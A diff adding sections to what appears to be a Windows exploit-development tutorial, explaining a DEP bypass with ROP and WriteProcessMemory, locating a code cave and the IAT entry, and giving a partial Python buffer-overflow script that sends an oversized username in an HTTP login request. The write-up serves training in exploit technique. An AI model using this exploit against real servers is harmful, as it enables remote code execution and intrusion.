@@ -96,6 +96,17 @@ BOOL WriteProcessMemory(
 
 ```
 
+
+- `hProcess` is a handle to the process memory to be modified. since we will be using the same current process the value will be -1 or 0xFFFFFFFF and this is called pseudo handle.
+- `lpBaseAddress` A pointer to a place / buffer and it’s called code cave in the memory where our shellcode will be writtren in.
+- `lpBuffer` This is basically the address of the shellcode, our shellcode will be in the lpBuffer and WPM will copy the shellcode from the lpBuffer and write to the address in lpBaseAddress
+- `nSize` This specifis the size of the shellcode and it must be same size as the shellcode or bigger.
+- `lpNumberOfBytesWritten` basically an optional argument and it can be NULL. It’s a pointer to a variable that receives the number of bytes transferred into the specified process by WPM.
+
+As earlier mentioned that lpBaseAddress points to a code cave.
+
+Code cave is an empty/unused memory region getting created by the compiler when compiling the software. This region must have READ & EXECUTE permissions.
+
 We need to push into the stack 7 values: the "WriteProcessMemory" function address, the return address of the function, and the five arguments. For that we will use an skeleton, which are dummy values that are pushed into the stack, then we will modify these values with ROP gadgets, and finally we will call the function with the desired values.
 
 To start with this ROP challenge we have to move the "esp" address to other register to be able to access and modify the values at the stack. The first ROP gadget will be a "push esp" instruction (if it exists). The first step is finding a module in the binary that is not compiled with "ASLR" and that does not have badchars at the address.
@@ -118,4 +129,115 @@ The first one has the badchar "0a" so we choose the second one and we add it to 
 
 ![imagen](https://github.com/user-attachments/assets/e3038ebd-c569-406c-837e-4b0e69cf6963)
 
+### Code Cave
 
+We can find the offset to the PE header by dumping the DWORD at offset 0x3C. Next, we’ll add 0x2C to the offset to find the offset to the code section:
+
+![imagen](https://github.com/user-attachments/assets/24f69ca8-c27b-4b95-b6ce-abe3b4ca938a)
+
+We use the following command --> `!address 10001000`
+
+And obtain the following output:
+
+![imagen](https://github.com/user-attachments/assets/5d76357e-e6a6-4e87-9f8a-90d837000a03)
+
+We need to search space for the shellcode:
+
+![imagen](https://github.com/user-attachments/assets/28d83696-c3c7-42d6-afba-19dd748871dc)
+![imagen](https://github.com/user-attachments/assets/07e5dd08-0053-457a-8563-972a3561f0f6)
+
+Because of the nullbyte, add 4 to the address 0x10167a00 resulting the address 0x10167a04.
+
+`lpNumberOfBytesWritten` argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it’s easier to use an address inside the data section of the module you are using.
+
+We use the `!dh` command to find the data section’s start address, supplying the -a flag to dump the name of the module.
+
+![imagen](https://github.com/user-attachments/assets/36b3ff52-87e2-45f5-86b5-cf587bb55c93)
+
+We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let’s dump the contents of the address just past the size value.
+
+![imagen](https://github.com/user-attachments/assets/ddd71d00-6142-411e-9cb0-7e87b70d0ab1)
+![imagen](https://github.com/user-attachments/assets/f0124769-6cbc-4a76-ba12-e904d8d982cc)
+
+Now we have a problem with the WriteProcessMemory address...
+
+WPM is part of KERNEL32, and KERNEL32 is a system DLL so it has ASLR enabled by default that means the real address of WPM will change each time rebooting the system or the software.
+The IAT addresses that point to functions are static meaning the IAT Address of WPM that points to the real WPM is static and won’t change.
+
+So let's inspect the IAT with `!dh -f libspp` command:
+
+![imagen](https://github.com/user-attachments/assets/ff42e42a-8604-44e4-b07a-7fa44ca67fd2)
+![imagen](https://github.com/user-attachments/assets/7860cd87-f3b0-4700-9e3a-0a139c81c3be)
+
+As you can see, there is no WriteProcessMemory function in the output so we need to choose another function and calculate the offset to WPM.
+
+![imagen](https://github.com/user-attachments/assets/ee912fb5-989b-4a97-aa9e-6fb56cc04db2)
+
+Let's begin with the ROP. For now we have the following exploit:
+
+```py
+#!/usr/bin/env python3
+import socket, sys
+from struct import pack
+
+def exploit():
+    try:
+        server = sys.argv[1]
+        port = 80
+
+        size = 800
+        offset = 780
+
+        shellcode = b""
+        
+        # badchars --> \x00\x0a\x0d\x25\x26\x2b\x3d
+        # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub 0xfffe2930
+        # KERNEL32!GetLastErrorStub IAT address --> 0x10168040
+        # CODE CAVE --> 0x10167a04
+        # Writable memory address --> 0x1020c044
+
+        #BOOL WriteProcessMemory(
+        #    [in]  HANDLE  hProcess,
+        #    [in]  LPVOID  lpBaseAddress,
+        #    [in]  LPCVOID lpBuffer,
+        #    [in]  SIZE_T  nSize,
+        #    [out] SIZE_T  *lpNumberOfBytesWritten
+        #);
+
+        wpm = pack("<L", 0x43434343)  # dummy WriteProcessMemory Address
+        wpm += pack("<L", 0x10167a04) # Return Address after WriteProcessMemory
+        wpm += pack("<L", 0xFFFFFFFF) # hProcess
+        wpm += pack("<L", 0x10167a04) # lpBaseAddress (Code cave address)
+        wpm += pack("<L", 0x46464646) # lpBuffer
+        wpm += pack("<L", 0x47474747) # nSize
+        wpm += pack("<L", 0x1020c044) # lpNumberOfBytesWritten (Writable memory address)
+
+        filler = b"A" * (offset - len(wpm))
+
+        # PUSH ESP and Realloc
+        eip = pack("<L", 0x100bb515)    # push esp; ret ;
+
+        rop = pack("<L", 0x1002f729)    # pop eax; ret ;
+
+        inputBuffer = filler + wpm + eip + rop
+
+        content = b"username=" + inputBuffer + b"&password=A"
+        buffer = b"POST /login HTTP/1.1\r\n"
+        buffer += b"Host: " + server.encode() + b"\r\n"
+        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
+        buffer += b"\r\n"
+        buffer += content
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((server, port))
+            s.send(buffer)
+            s.close()
+            print(f"[*] Malicious payload sent")
+    except Exception as e:
+        print(e)
+
+if __name__ == '__main__':
+    exploit()
+```
